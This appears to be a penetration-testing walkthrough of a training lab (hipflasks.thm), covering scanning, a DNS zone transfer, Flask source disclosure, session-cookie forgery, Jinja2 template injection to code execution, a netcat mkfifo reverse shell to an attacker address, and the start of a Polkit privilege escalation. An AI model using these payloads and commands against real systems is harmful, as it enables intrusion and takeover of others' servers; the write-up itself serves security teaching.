# Process of Pentesting

## Scoping

Before begining an engagement, it is vitally important that both sides are completely clear about what will happen, and when it will happen. This effectively amounts to the client providing the pentester(s) with a list of targets, things to look out for, things to avoid, and any other relevant information about the assignment. In turn, the assessing team will establish whether the clinet's request is possible to fulfil, then either work with the client to find a more suitable scope or move on to arrange a period of time when the testing will be carried out. Additionally, the pentesters will also provide the client with the IP addresses the attackes will be coming from.

This process is refered to as scoping.

Aside from the scoping meetings the client will also provide the testing team with a point of contact in the company. This person will work with the team to some extent throughout the testing. In many cases this may simply be the person to reach out to should something go wrong; in other cases there may be daily, or even hourly reporting to this indivudual.

The pentesting methodologies are black box, grey box, and white box testing. In a purely black box penetration test the assessing team will be given no information about the targets, aside from addresses or an address range to attack. In extreme cases the attackers may be given little more than the company name and be forced to determine the addresses for themselves. In short, the attackers start with no prior information and have to perform initial enumeration for themselves from the same starting position as a bad actor (a malicious hacker, or goup of hackers, attacking the target without permission). This is good from a realism perspective, however, pentests are expensive and many companies do not wish to pay the assessors to sit around and perform initial footprinting of the organisation.

At the opposite end of the spectrum is white box penetration testing. As expected, in a white box penetration test, the attackers are given all relevant information about the target(s), which they can review in order to find vulnerabilities based on prior security knowledge and experience.

Most common are grey box tests where only some of the relevant information is provided by the client. The amount disclosed is dependent on the client and the target, meaning that a grey box test could fall anywhere on a sliding scale between white and black box tests.

The most common types of penetration test are web application and network pentests.

- Web application penetration testing revolves (as the name would suggest) around searching for vulnerabilities in web applications. In this style of assessment, the scope would provide the pentesters with a webapp (or multiple webapps) to work with. In a white box webapp pentest, the source code for the application would usually also be disclosed. Assessors would then attempt to find vulnerabilities in the application(s) over a period of time; following a methodology such as that outlined in the [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable)
- Network pentest (often called infrastructure pentests) can be further split into two categories: internal and external
  - External network pentests are when the client provides a public-facing endpoint (such as VPN server or firewall) and asks the pentesters to assess it from the outside. Should the assessors succeed in gaining access, a further consultation with the client would be required to discuss an extension of the scope to include internal targets.
  - Internal network pentests usually involve a pentester physically going to the client and attacking the network from on-site, although remote internal pentests where companies give the pentester remote access to amachine in the network (e.g. via VPN) are growing in popularity. These are relatively common as companies often want to test their active directory infrastructure.

## Procedure

When a vulnerability is found in a target, there need to be astandardised way of evaluating and judging the severity of vulnerabilities.

The Common Vulnerability Scoring System is an open framework originally developed by the United States National Infrastructure Advisory Council (NIAC). It has since passed into the care of the Forum of Incident Response and Security Teams (FIRST); a global collaborative who have been maintaining the system since 2005. The short version is: the CVSS scoring system gives us a common method for calculating vulnerability scores which we can then share with a client.

## Enumeration - Outline

With the scope planned out, the day of the engagement is upon us!

It's time to start the testing. In hacking (as with everything), information is power. The more we know about the target, the more options we have available to us; thus we start with various kinds of enumeration.

We would often start with a passive footprinting stage before beginning the active enumeration that you may be familiar with. This would be time spent performing gathering OSINT (Open-Source Intelligence) about the target from their online footpring. For example, we may look for public email addresses, employee names, interesting subdomains/subdirectories in websites, Github repositories, or anything-else that are publicly available and may come in handy. Tools like [TheHarvester](https://tools.kali.org/information-gathering/theharvester) and the [Recon-ng](https://tools.kali.org/information-gathering/recon-ng) framework may come in handy for this.

## Enumeration - Port Scanning

Active scans like -T5 or -A switches for nmap is good for lab environment but is less likely to go well in the real world. In reality, fast and furious enumeration is much more likely to damage a target unnecessarily (the point can be made that if a server is unable to stand up to a port scanner then it isn't fit for purpose, but do you really want to explain to the client and your boss why the company website has gone down?). The mantra "slow and steady wins the race", comes to mind. Realistically, in today's world anything other than a small, slow, home-brew port scanner will be picked up by most intrusion detection systems very quickly indeed; however, we may as well minimise our own footprint as much as possible.

Quick scans with a small scope can be used to get an initial idea of what's available. Slower scans with a larger scope can then be run in the background whilst you look into the results from the initial scans. The goal should be to always have something running in the background whilst you focus on something else (a philosopy which shouldn't just apply to initial enumeration).

We can see that the server doesn't respond to ping, but we know the machine is active, so there is a firewall between us and the server. With that in mind let's do a quick TCP SYN scan against the top 1000 most common TCP ports on the target. If not already running as root, we will do this with **sudo** so that we can use a SYN "Stealth" scan (which is default for the root user):

```bash
$sudo nmap -vv ip -oN Initial-SYN-Scan
```

We have found 4 open ports 22, 53, 80 and 443, 22-ssh, 80-http, 443-https are common for a linux server but 53-dns is an interesting one.

Now lets scan for services.

```bash
$sudo nmap -p 22,53,80,443 -sV -Pn -vv target_ip -oN service-scan
```

We have found the versions of discovered services of 3 ports but the banner for DNS server is spoofed. Let's perform an UDP scan to confirm port 53 is indeed open. We go for scanning top 50 UDP ports.

```bash
$sudo nmap -sU --top-ports 50 -Pn -vv --open target_ip -oN udp-top-ports
```

Much like the **filtered** response from a TCP scan referring to a firewall in play, the **open|filtered** response in a UDP scan indicates a possible firewall. As the scan indicates, the three ports showing this state provided no response to the scan. This could mean that there is afirewall preventing access to the ports, or it could mean that the ports are open and just don't return a response (as is frequently the case with UDP). In short, UDP scans are not very accurate, but we have confirmed that UDP/53 is open.

### To summarise, based on initial information, we know for sure that there are three services running: SSH on TCP port 22, DNS on TCP and UDP ports 53 (with a modified banner), and HTTP(s) on TCP 80 and 443

## Enumeration - Vulnerability Scanning

With the initial enumeration done, let's look at some vulnerability scanning.

We could use Nmap for this (making use of the NSE - Nmap Scripting Engine);

```bash
$sudo nmap --script=vuln target_ip -oN vuln-scan
```

or we could do the more common thing and switch to an industry-standard vulnerability scanner: Nessus.

Vulnerability scanner are used to scan target (or usually a wide range of targets across a client network), checking for vulnerabilities against a central database. They will usually provide a list of discovered vulnerabilities, ranked from critical down to low or informational, with options to filter the results and export them into a report. There are a variety of vulnerability scanners available, including the opensourse [OpenVAS Framework](https://openvas.org), however, [Nessus](https://tenable.com/products/nessus) is one of the most popular vulnerability scanners currently available when it comes to industry usage. Go [here](https://tryhackme.com/room/openvas) To learn about OpenVAS and [here](https://tryhackme.com/room/rpnessusredux) to learn about Nessus.

As it happens, none of the vulnerabilities scan results are useful to us in terms of exploiting the target further (both medium vulnerabilities being to do with the self-signed SSL cert for the server, and the low vulnerability relating to a weak cipher enabled on SSH); however, they would definitely be worth reporting to the client.

## Enumeration - Web App: Initial Thoughts

Of the three services available, the webserver is the one most likely to have vulnerabilities that Nessus couldn't find. As the client has not asked us to focus specifically on the webapp, but rather on the server as a whole, we will not do a deep-dive analysis on the website(s) being served by the webserver. We can always discuss adding a full web application pentest to the scope with the client later on.

Nginx is easy to misconfigure, and any custom webapps on the server could potentially have vulnerabilities that Nessus is unable to detect. At this point we don't know if Nginx is being used as a reverse proxy, or if it has its PHP engine installed and enabled.

Navingating to the target IP address in Firefox gives us a message

```html
Host Name: ip, not found.
This server hosts sites on the hipflasks.thm domain.
```

This is the same for both the HTTP and HTTPS versions of the page. Aside from the overly verbose error message (which in itself is unnessary information exposure and should be rectified), we also learn that the client's domain appears to be **himflasks.thm**.

### Set-Up Firefox to resolve domain name for the machine

Editing the system-wide DNS servers for a split-tunnel VPN connection linke the one used for TryHackMe is, frankly, a colossal pain in the rear end. Fortunately there is an easier "hack" version using the FireFox config settings. This wil only allow FireFox to use the DNS server, but right now that's all we nee.

1. Navigate to about:confg in the FireFox search bar and accept the risk notice.
2. Search for network.dns.forceResolve, double click it and set the value to the IP address of the target machine, then click the tick button to save the setting:

## Enumeration - DNS

We still don't actually know exactly what DNS server is in use here; however, there are very few current vulnerabilities in Linux DNS servers, so the chances are that if there's something to be found, it will be a misconfiguration.

Fortunatelyu for us, misconfigurations in DNS are notoriously eaasy to make.

As the address system of the internet, it need not be said how important DNS is. As a result of this importance, it is good practice to have at least two DNS servers containing the records for a zone (or domain, in normal terms). This means that if one server goes down, there is still at least one other which contains the records for the domain; but this poses a problem: how do you update DNS records for the zone without having to go and update every server manually? The answer is something called a "Zone Transfer". In short: one server is set up as the master (or primary) DNS server. This server contains the primary records for the zone. In BIND9, zone configuration files for a primary server look something like this:

```bash
zone "example.com" IN {
    type master;
    file "/etc/bind/db.cxample.com";
    allow-query {any;};
    allow-transfer {172.16.0.2};
}
```

This defines a master zone for the domain example.com, it tells BIND to read the records from a file called ```/etc/bind/db.examples.com``` and accept queries from anywhere. Crucially, it also allows zone transfers to an IP address: ```172.16.0.2```.

In addition to the primary DNS server, one or more "slave" (or secondary) DNS servers are set up. They would have a zone file looking like this

```bash
zone "example.com" IN {
    type slave;
    file "/etc/bind/db.example.com";
    masters {172.16.0.1; };
    allow-transfer {none; };
};
```

This defines a slave zone, setting the IP address of the primary DNS server in the masters {}; directive.

### Zone Transfer

-------------------------------------------------------------------------------------------------;

Zone transfers allow secondary DNS servers to replicate the records for a zone from a primary DNS server. At frequent intervals (controlled by the Time To Live value of the zone), the secondary server(s) will query a serial number for the zone from the primary server. If the number is greater than the number that the secondary server(s) have stored for the zone then they will initiate a zone transfer, requesting all of the records that the primary server holds for that zone and making a copy locally. In some configurations a "DNS Notify List" may also exist on the primary DNS server. If this is in place then the primary server will notify all of the secondary servers whenever a change is made, instructing them to request a zone transfer.

--------------------------------------------------------------------------------------------------;

What if a DNS server has an entry in the zone config which looks like this: ```allow-transfer {any; };``` Rather than specifying a specific IP address (or set of IP addresses), the server allows any remote machine to request all of the records for the zone. This means that if the server is configured incorrectly we may be able to dump every record for the domain including the subdomains we are looking for here!

Zone transfers are initiated by sending the target DNS server an axfr query. This can be done in a variety of ways, however, on Linux it is easiest to use either the dig or host commands.

```bash
$dig axfr hipflasks.thm @10.10.81.95
#or
host -t axfr hipflasks.thm 10.10.81.95
```

## Enumeration - Web App Fingerprinting and Enumeration

Having a look around the page and in the source code, there don't appear to be any working links, so if we want to access other pages then we will need to look for them ourselves. Of course, directory listing is disabled, which makes this slightly harder.

The source code does indicate the presentce of **assets/**, **assets/img/**, **css/**, and **js/** subdirectories, which seem to contain all of the static assets in use on the page

Having a look through some of the font stylesheets reveals that there is also an **assets/fonts/** subdirectory. E.g. in **css/railway.css**

```css
@font-face {
    font-family: 'Raleway';
    font-style: italic;
    font-weight: 100;
    src: url(/assets/fonts/1Pt_....JQ.ttf) format('truetype');
}
```

Nothing ground breaking so far, but we can start to build up a map of the application from what we have here:

```bash
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
```

Now we can use BurpSuite to intercept the response from the server and can find some interesting info from the header.

First of all, the server header: waitress. This would normally be Nginx, as we already know from the TCP fingerprint that this is the webserver in use. This means that we are dealing with a reverse proxy to a waitress server. A quick Google search for waitress web app tells us that Waitress is a production-ready Python WSGI server; in other words, we are most likely dealing with either a Django or a Flask webap, these being the most popular Python web-development frameworks.

Secondly, there are various security-headers in play here, however, notably absent are the **Content-Security-Policy** and **X-XSS-Protection** headers, meaning that the site may be vulnerable to XSS, should we find a suitable input field. Equally, the HSTS (Http Strict Transport Security) header which should usually force a HTTPS connection won't actually be doing anything here due to the self-signed certificate.

Before we go further, let's start a couple of scans to run in the background while we look around manually. Specifically, let's go for Nikto and Feroxbuster (or Gobuster), running in parallel.

```bash
$nikto --url https://hipper.hipflasks.thm | tee nikto
$feroxbuster -t 10 -u https://hiper.hipflasks.thm -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,html,txt -o feroxbuster
```

## Web App - Understanding the Vulnerability

Web apps traditionally follow the same structure asthe underlying file-system. For example, with a PHP web application, the root directory of the webserver would contain a file called **index.php**, and usually a few subdirectories related to different fundtions. There might then be a subdirecotry called **about/**, which would also contain an **index.php**. The index files are used to indicate the default content for that directory, meaning that if you tried to access **<https://example.com/>**, then the webserver would likely actually be reading a file called **/var/www/html/index.php**. Accessing **<https://example.com/about/>**, would be reading **/var/www/html/about/index.php** from the filesystem.

This approach makes life very easy for us as hackers. if a file is under the webroot (**/var/www/html** by default for Apache on Linux) then we will be able to access it from the websever.

Modern webapps are often not like this though -- they follow a design structure called "routing". Instead of the routes being defined by the structure of the file system, the routes are coded into the webapp itself. Accessing **<https://example.com/about/>** in a routed web app would be a result of a program running on the webserver (written in something like Python -- like our target application here -- NodeJS or Golang) deciding what page you were trying to access, then either serving a static file, or generating a dynamic result and displaying it to you. This approach practically eliminates the possibility of file upload vulnerabilities leading to remote code execution, and means that we can only access routes that have been explicitly defined. It's also a lot neater that the traditional approach from an organisational perspective.

There is a downside to routing, however. Serving static content such as CSS or front-end Javascript can be very tedious if you have to define a route for each page. Additionally, it's also realatively slow to have your webapp handling the static content for your (although most frameworks do have the option to server a directory). As such, it's very common to have a webapp sitting behind a reverse proxy such as Nginx or Caddy. The webserer handles the static content, and any requests that don't match the ruleset defined for static content get forwarded to the webapp, which then sends the response back through the proxy to the user.

What this means is that searching for file extensions in a route fuzzing attempt (like the Feroxbuster scan we ran) won't actually do anything with a routed application, unless the reverse proxy has been misconfigured to serve more static content than it's suposed to. Unfortunately, it is very easy to mess up the configuration, for a reverse proxy, for example, this common Nginx configuration could potentially leak the full source code for the webapp -- a very dangerous prospect.

```nginx
root /var/www/webapp;
location ^~ {
    try_files $uri $uri @proxypass;
}

location @proxypass {
    //Various proxy headers
    proxy_pass htt://127.0.0.1:8000;
}
```

This configuration fist looks for files in **/var/www/webapp** and its subdirectories. For example, if you were looking for *htts://example.com/assets/css/style.css* then Nginx would look for **/var/www/webapp/asstes/css/style.css/**. Notice that this is identical behaviour to an non-routed webapp.

If the file exists then Nginx will serve it and the request will never reach the webapp. If the file does not exist then the request gets sent to the named location block: **proxypass**, which results in it getting passed to the webapp running on **127.0.0.1:8000**.

This is all well and good, but what happens if the source code for the webapp is also stored in **/var/www/webapp**? A request to **/var/www/webapp/app.py**, for example may leak the source code for the webappp, as Nginx would see that the file exists and serve it as plaintext before the request even reaches the webapp. An example application structure may look something like this:

```bash
/
|__app.py
|__assets/
|____css/
|______style.css
|____js/
|______scripts.js
|____app_modules/
|______database/
|________connection.py
```

This would result in Nginx serving the assets directory, yes, but it would also be serving all of the Python files.

A better solution would be to use a configuration such as this:

```nginx
root /var/www/webapp;
location ^~ /assets {
    alias /var/www/webapp/assets;
}

location / {
    //Various proxy headers
    proxy_pass http://127.0.0.1:8000;
}
```

This would take any requests to **/assets/\*** and attempt to serve the static files. Anything else would just get passed straight to the webapp.

There are million-and-one different ways to accomplish the same objective with Nginx configuration files -- many of them will have vulnerabilities like this, many will not. It all depends on the experience of the sysadmin. As such, searching for **.py** file with feroxbuster is still an effective strategy when we know that tehere is a reverse proxy in front of our Python webapp -- even with a routed application.

## Web App - Full Source Code Disclosure

Let's focus on gathering more information about the application; using our discovered file to grab the rest of the code seems like a good start. Flask applications work by having one main file. This file then imports everything else that the application needs to runn -- for example, blueprings that map out other parts of the app, authentication modules, etc.

This means that we don't need to do any more fuzzing to find the rest of the source code: we can just read what the main.py file is importing and pull on the metaphorical thread until we have all of the files downloaded. Whenever we find a new file, we should download a copy locally using the curl **-o Filename** switch so that we can review the source code in detail later.

Let's start by looking at what the **main.py** file is importing:

```python
from flask import Flask, redirect, render_template, request, session
from datetime import datetime
from waitress import serve
from modules import abp
from libs.db import AuthConn, StatsConn
```

A lot of these are just standard Python modules (which we can chekc by Googling them), but the last two lines are reffering to custom modules.

The syntax here tells us a lot. Starting with the first line of interest (```from modules import abp```), we can see that it's importing an object called abp (which, looking further down the code appears to be a Bluepring) from a modules file. This could mean one of two file structures:

- There is a file calles modules.py in the webroot.
- There is a directory called modules in the webroot which contains a file called **__init__.py** -- a file effectively used to initialise a new module inside a directory.

Only one way to find out which it is. Lets try both!

Note: -k switch must be used with curl command to ignore the self-signed certificate.

CURLing **https://hipper.hipflasks.thm/modules.py** gives us 404 error, so it must be the second option.

CURLing **https://hiper.hipflasks.thm/modules/__init__.py** gives us what we're looking for. The file contains a single line 

```python
from modules.admin import abp
```

As expected, the init (initialisation) file is importing the abp Blueprint object from another Python file in the directory: **admin.py**

CURLing **https://hipper.hipflasks.thm/modules/admin.py** give us a much chunkier file

Once again we have some imports we can look into:

```python
from libs.auth import authCheck, checkAuth
from libs.db import AuthConn, StatsConn
```

The libs.db import is the same as the second import in main.py, but we can add libs.auth to our list of things to check.

We know that a libs/ subdirectory exists (it has to be a subdirectory if we're importing two different modules from it), but we don't know if the two files we know of (auth and db) are Python files, or directories.

We can establish this in the same way as before -- first checking to see if **libs/auth.py** exists, then if that fails , checking to see if **libs/auth/__init__.py** exists.

When attempting to cURL **https://hipper.hipflasks.thm/lib/auth.py** we receive a 200 response and a Python file, so this is clearly the correct path.

Looking at the other items in the libs/ subdirectory, we can quickly ascertain that this is a directory by the presence of a **libs/db/__init__.py** file:

```python
from libs.db.base import Conn
from libs.db.auth import AuthConn
from libs.db.stats import StatsConn
```

Three imports means three different files -- either more directories or Python files.

Using the same method as before we find that these three are python files. However, there are a few more things we can fill in.

First, from the **main.py** file we can see that the app's template folder has been set to "views":

```python
app.template_folder="views"
```

The template folder contains static HTML templates which Flask uses to create dynamic responses. For example, in line 24 of **main.py**, we can see an example of the Flask **render_template** function where it passes in the current year to be used for the copyright notice in the index.html template.

```python
main.py, line 24
return render_template("index.html", year=datetime.now().date.strftime("%Y"), 200)
```

Similarly, looking at the files in **libs/db/** tells us that there is a directory called **data/** containing two SQLite3 databases: **users.db** and **stats.db**.

So our final structure diagram now looks like this:

```bash
/
|__app.py
|__assets/
|____imgs/
|____fonts/
|__css/
|____style.css
|__js/
|____scripts.js
|__modules/
|____ __init__.py
|____admin.py
|__libs/
|____auth.py
|____db/
|______base.py
|______auth.py
|______stats.py
|__views/
|____index.html
|__data/
|____users.db
|____stats.db

```

## Web App - Implication of the Vulnerability

Because HTTP(S) is inherently stateless, websites store information which needs to persists between requests in cookies -- tiny little pieces of information stored on your computer. Unfortunately, this also poses a problem: if the information is stored on your computer, what's stopping you from just editing it? When it comes to sessions, there are two mainstream solutions.

Sessions are a special type of cookie -- they identify you to the website and need to be secure. Sessions usually hold more information than just a single value (unlike a standard cookie where there may only be a single value stored for each index). For example, if you are logged into a website then your session may contain your user ID, privilege levels, full name, etc. It's a lot quicker to store these things in the session than it is to constantly query the database for them!

So, how do we keep sessions secure? There are two common schools of thought when it comes to session storage:

- **Server Side Session Storage:** store the session information on the server, but give the client a cookie to identify it.
  - This is the method which PHP and most other traditional languages use. Effectively, when a session is created for a client (i.e avisitor to the site), the client is given a cookie with a unique identifier, but none of the session information is actually handed over to the client. Instead the server stores the session information in a file locally, identified by the same unique ID. When the client makes a request, the server reads the ID and selects the correct file from the disk, reading the information from it. This is secure because there is no way for the client to edit the actual session data (so there is not way for them to elevate their privileges, for example).
  - There are other forms of server side session storage (e.g. storing the data in a Redis or memcached server rather than on disk), but the principle is the same.
- **Client Side Session Storage:** store all of the session information in the client's cookies, but encrypt of sign it to ensure that it can't be tampered with.
  - In a client side session storage situation, all of the session values are stored directly within the cookie -- usually in something like a JSON Web Token (JWT). This is the method Flask uses. The cookie is sent off with each request as normal and is read by server, exactly as with any other cookie -- only with an extra layer of security added in. By either signing or encrypting the cookie with a private secret known only to the server, the cookie in theory cannot be modified. Flask signs its cookies, which means we can actually decode them without requiring the key.

## Web App - Source Code Review

Now that we have a copy of the source code for the site, we have effectively turned the webapp segment of this assessment into a white-box testing.

Let's start by looking at **modules/admin.py**. This contains the code defining the admin section -- if we look at this then we will see what authentication measures are in place:

```python
#!/usr/bin/python3
from flask import Blueprint, render_template_string, request redirect, session, abort, url_for, flash, get_flashed_messages
from libs.auth import authCheck, checkAuth
from libs.db import AuthConn, StatsConn

abp = Blueprint("abp", __name__)

@abp.route("/")
@authCheck
def manageHome():
    conn = StatsConn()
    uniqueViews = conn.getViews()
    response = f"""..........."
```

Right at the top of the file we find what we're looking for. Specifically, thereis one line of code which handles the authentication for the /admin route:

@authCheck

Imported in:

```python
from libs.auth import authCheck, checkAuth
```

This is what is referred to as a decorator -- a function with wraps around another function to apply pre-processing.

If we have a look at **/libs/auth.py** we can see the code for this:

```python
import section
checkAuth = lambda: session.get("auth") == "True"

def authCheck(func):
    @wraps (func)
    def innerCheck(*arts, **kwargs):
        if checkAuth():
            return func(*args, **kwargs)
        else:
            flash("Please login before accessing the admin area")
            return redirect(url_for("abp.loginRoute")), 301
    return innerCheck
```

Breaking this down a little further, the authentication is handled by a single if/else statement. If checkAuth() (the lambda function above) evaluates to true then the decorated function is called,k resulting in the requested page loading. If the expression evaluated to false then a message is flashed to the user's session and they are redirected back to the login page. About as simple as it gets.

Looking into the checkAuth lambda function:

```python
checkAuth = lambda: session.get("auth") == "True"
```

We can see that all it does is check to see if the user has a value called "auth" in their session, which needs to be set to True.

This can easily be forged, so in theory we can already get access to the admin area.

Let's have a look at the login endpoint back in **modules/admin.py**

```python
@abp.route("/login", methods=["POST"])
def loginFunction():
    body = request.form
    if "username" not in body.keys() or "password" not in body.keys():
        flash("Incorrect Parameters")
        return redirect(url_for("abp.loginRoute")), 301
    conn = AuthConn()
    if conn.authenticate(body["username"], body["password"]):
        session["auth"] = "True"; session["username"] = body["username"]
        return redirect(url_for("abp.manageHome")), 301
    flash("Incorrect username or password", "error")
    return redirect(url_for("abp.loginRoute")), 301
```

Breaking this down, we see that it's expecting a post request. It then stores the information being sent in a variable called **body**, then checks to ensure that the parameters **username** and **password** have been set -- if they haven't been then it flashes an Incorrect Parameters message and redirects them back to the login page.

If these parameters are present then it initialises a connection to the users database and checks the username and password. If the authentication is successful then it sets two session values:

- It sets **auth** to "True".
- It sets **username** to the username that we posted it. This will be important later.

It then redirects the user to the management homepage (**/admin**).

## Web App - Cookie Forgery

There are many ways to forge a Flask cookie -- most involve diving down into the internals fo the Flask module to use the session handler directly: a very complicated solution to what is actually an incredibly simple problem.

We need to generate Flask cookie. What better way to do that than with a Flask app?

In short, we are going to write down our own (very simple) Flask app which will take the secret key we "borrowed" and use it to generate a signed session cookie with, well, basically whatever we want int it.

Crete a python virtual environment

```bash
$python3 -m venv poc-env
```

This will create a subdirecotry called poc-env containing our virtual environment.

We can activate this using the command ```source poc-venv/bin/activate```.

Let's install required dependencies for our program.

```python
pip3 install flask requests waitress
```

Waitress isn't actually required here, but using it is very simple and makes the output much cleaner, so we might as well add it in.

Next we need to open a blank text document and start a new Python script.

```python
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

app = Flask(__name__)
ap.config["SECRET_KEY"] = "put the key here"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check you cookies", 200
```

Our app is now ready to go, we just need to start it an query it.

We could technically just start the app here and navigate to it in our browser, but that would be boring. Lets do this all from the command line.

If we are doing two thing at once (starting the app, then sending a request to it), we will need to use threading, thus our next lines of code are:

```python
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()
```

This creates a thread and gives it the job of starting waitress using our app object on localhost:9000. It then tells the thread to daemonise, meaning it won't prevent the program from exiting (i.e. if the program exsits then the server will also stop, but the program won't wait for the server to stop before exiting). Finally we start the thread, making the server run in the background.

The last thing we need this program to do is query the server:

```python
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

This will wait for one second to give waitress enough time to start the server, then it will query the endpoint that we setup, making Flask generate and provide us with a cookie with the program will then print out. The program then ends, stopping the server automatically.

## Web App - Server-Side Template Injection (SSTI)

We have gained access to the admin console, but we don't appear to have gained anything by doing so. All we have here is a stats counter (which we already had from downloading the DB anyway).

So, why did we bother going through all that rigamarole if the admin console doesn't actually give us any extra power over the webapp?

When we logged into the admin page, we did notice that it echoed the forged username back to us. This indicates that there is some form of template editing going on in the background -- in other words, the webapp is taking a prewritten themplate and injecting values into it. There are secure ways to do this, and there are... less secure ways of doing so.

Specifically, the code involved (from **/modules/admin.py**) is this:

```python
@abp.route("/")
@authCheck
def manageHome():
    conn = StatsConn()
    uniqueViews = conn.getViews()
    response = f"""
    <!Doctype html>
    <html lang=en>
        <head>
            <title>Admin Section</title>
    ------
                    <span class="section-heading-upper">Admin Console</span>
                    <span class="section-heading-lower">Welcome, {session['username']}</span>
                </h2>
                <p class="mb-3">There have been {uniqueViews} unique visitors to the site!</p>
            </div>
    ------
    """
    return render_template_string(response), 200
```

Aside from using an inline string for the template (which is both messy and revoltingly bad practice), this also injects the contents of **session["username"]** directly into the template prior to rndering it. It does the same thing with **uniqueViews** (the number of visitors to the site); however, we can't modify this. What we can do is change our username to something that the Flask templating engine ([Jinja2](https://jinja2docs.readthedocs.io/en/stable)) will evaluate as code. This vulnerability is referred to as an SSTI -- Server Side Template Injection; it can easily result in remote code executino on the target.

## Web App - SSTI -> RCE

Okay, now it's time for RCE. From [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/) there are various RCE payloads available here. Through trial and error, we find one which works:

```python
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

If we put this into our PoC code in the username field then execute the script and overwrite our cookie again, we can confirm that this works.

Almost time to weaponize this, but first we need to do a little enumeration. Specifically, we need to know if there is a firewall in place, what software is installed, and preferably if there are any protective measures in place. This is Linux so the chances of having to deal with anti-virus is minimal, but we may need to circumvent hardening measures (e.g. AppArmour, SeLinux, etc).

Running multiple commands in this situation is a pain as we would need to generate a new cookie for each command. Instead we will just use one big one-liner to enumerate as many thing as possible at once:

```python
session["username"]="""{{confg.__class__.__init__.__globals__['os'].popen('echo ""; id; whoami; echo ""; which nc bash curl wget; echo ""; sestatus 2>&1; aa-status 2>&1; echo ""; cat /etc/*-release; echo ""; cat /etc/iptables/*').read()}}"""
```

From the output we can see the followings:

- as expected we are in the low-privileged **www-data** account
- We have enough useful software to easily make web requests and create a reverse Shell
- SeLinux is not installed. AppArmour is, and we don't have permission to view the status, so we'll have to go in blind and hope
- This is an Ubuntu 20.04 machine -- as expected
- There is firewall in place (as expected). It blocks all outgoing traffic to anything other than TCP ports 443, 445, 80, 25, or 53, and UDP port 53. Outbound ICMP packets are allowed. There are no IPv6 rules.

We've done all we can for now. Let's get a shell and be done with this. A standard netcat mkfifo shell ought to do the trick:

```python
session["username"] = """{{confg.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc Con_IP 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"""
```

## Enumeration - Shell Stabilisation and Local Enumeration

Before we do anything else, let's quickly stabilise our reverse shell. As www-data we won't be able to use SSH, so that's out. We could upload socat and use that, but we don't know what AppArmour is doing just now (although checking that with our new access should be high on our list of priorities!). Let's instead just use the classing Python shell stabilisation technique.

First let's check that we can use Python:

```bash
which python python3
```

The affirmative response indicates that this technique is good to go, so we will start by creating a PTY running bash:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Next we set the TERM environment variable. This gives us access to commands such as clear.

```bash
export TERM=xterm
```

Finally we remove the terminal echo of our own shell (so that we can use Ctrl + C/Ctrl + Z without killing our shell), and set the tty size of our remote shell to match that of our terminal so that we can use full-screen programs such as test-editors.

- Press Ctrl-Z (or equivalent for your keyboard) to background the remote shell.
- Run ```stty -a``` in your own terminal and note the values for rows and columns.
- RUn ```stty raw -echo; fg``` in your own terminal to disable terminal echo and bring the remote shell back to foreground.
- Use ```stty rows Number cols Number``` in the remote shell to set the tty size

Note: these numbers depend on your screen and teminal size and will likely be different for everyone.

Bingo! We are now in a fully stabilised shell.

Let's quickly check the **/etc/apparmor.d** directory to see if there are any configurations that would restrict us from enumerating:

```bash
$ls -la /etc/apparmor.d
```

It doesn't look like there are any custom policies or signs of anything being locked down more that the default configuration, so we should be good to go on the enumeration front. That said, the fact that FireFox, LibreOffice and cupsd are installed is very interesting -- these indicate that the machine ahs a desktop environment installed (presumably it has a monitor plugged in for easy configuration whereever it is in the client's office). Worth keeping in mind as we progress.

Now would be a good time to start some enumeration scripts (e.g. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), [LinEnum](https://github.com/rebootuser/linEnum), [LES](https://github.com/mzet-/linux-exploit-suggester), [LSE](https://github.com/diego-treitos/linux-smart-enumeration), [Unix-Privesc-Check](https://pentestmonkey.net/tools/audit/unix-privesc-check), etc). It's good practice to run several of these, as they all check for slightly different things and what one finds another may not.

That said, before we start uploading scripts, we would be as well performing a few manual privilege escalation checks. This is especially useful if there are serious new vulnerabilities out for the distribution that we're attacking as these may not yet be patched on the target. There is a brand new privilege escalation vulnerability in the Polkit authentication module which affects Ubuntu 20.04 ([CVE-2021-3560](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug)), so checking for this is an absolute must. Running any of the scripts (or checking manually), we also find that there are no user accounts on the machine, and that SSH is enabled for the root user with a private key. This indicates that the root account is used for day-to-day administrative tasks.

There's no strict order for manual checking, so lets just jump straight to it and look for unpatched software.

```bash
$apt list --upgradeable
```

Quite the list! This machine is clearly in need of some upgrades, which could be very good for us and very bad for the client.

Unfortunately for the client, the polkit libraries are not updated (version **0.105-26ubuntu1** rather than **0.105-26ubuntu1.1**), which means we should be able to escalate privileges straight to root using [CVE-2021-3560](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug).

## Privilege Escalation - Polkit

[CVE-2021-3560](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug) is, fortunately, a very easy vulnerability to exploit if the conditions are right. The vuln is effectively a race condition in the policy toolkit authenticaiton system.

Effectively, we need to send a custom dbus message to the account-daemon, and kill it approximately halfway through execution (after it gets received by polkit, but before polkit has a chance to verify that it's legitimate -- or, not, in this case).

We will be trying to create a new account called attacker with sudo privileges. Before we do so, let's check to see if an account with this name already exists.

```bash
id attacker
```

Perfect this username is free to use!

Now that we've established that we can create a new account with the username "attacker" without disrupting anything else on the box, lets get a benchmark for how long it takes to send and process a dbus message to the accounts daemon:

```bash
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
```

